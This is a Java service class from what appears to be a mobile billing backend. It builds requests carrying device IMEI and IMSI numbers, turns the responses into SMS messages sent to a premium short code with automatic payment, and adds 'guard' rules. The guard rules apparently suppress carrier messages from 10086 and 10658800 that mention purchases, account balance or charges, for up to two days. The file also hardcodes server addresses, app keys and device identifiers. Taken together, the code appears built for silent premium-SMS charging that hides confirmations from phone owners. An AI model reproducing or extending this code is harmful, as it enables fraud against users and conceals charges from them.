package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;
import com.qlzf.commons.helper.MD5Encrypt;

/**
 * http://120.24.236.63:8080/mm?appKey=0C28D41D0F28CC9B5C6A8580693442BB&imei=862594025131367&imsi=460025399810374&code=30000871329206&os=4.2.1&model=2013022&data=00000000&pay=auto
 * @author leoliu
 *
 */
public class HhkjMm1DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(HhkjMm1DynamicService.class);
	
	private static final String TYPE = "hhkjMm1";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "10658424";
	
	private static final String REQUESTMODEL = "appKey={appKey}&imei={imei}&imsi={imsi}&code={code}&os=4.2.1&model={model}&data={data}&pay=auto&channelId={channelId}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appKey = map.get("appKey");
			String code = map.get("code");
			String model = map.get("model");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String data = map.get("data");
			String channelId = StringUtils.defaultString(map.get("channelId"));
			
			String param = REQUESTMODEL.replace("{appKey}",appKey).replace("{code}",code).replace("{model}",model).replace("{data}",data).replace("{imei}",imei).replace("{imsi}",imsi).replace("{channelId}", channelId);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			logger.info(responseXml);
			
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(responseXml);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
				
			return XstreamHelper.toXml(smsList);
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://211.154.162.11/recYdmmAction.action?companycode=W1001&pid=ttddz20c&statement=W100120140529174&imsi=460021281243687&imei=863388028868466&mobileip=202.108.36.125&sign=F0B9CB8094C477E328043EBBB9787362
//		appKey=0C28D41D0F28CC9B5C6A8580693442BB&imei=862594025131367&imsi=460025399810374&code=30000871329206&os=4.2.1&model=2013022&data=00000000&pay=auto
		String url = "http://120.24.236.63:8085/mm";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("appKey", "B060BF9BDF4A39DA670C50F6B877AB9E");
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		map.put("code", "30000886188203");
		map.put("model","2013022");
		map.put("data", "00000000");
		map.put("channelId", "3003983448");
		
		System.out.println(new HhkjMm1DynamicService().dynamic(map));
	}

}
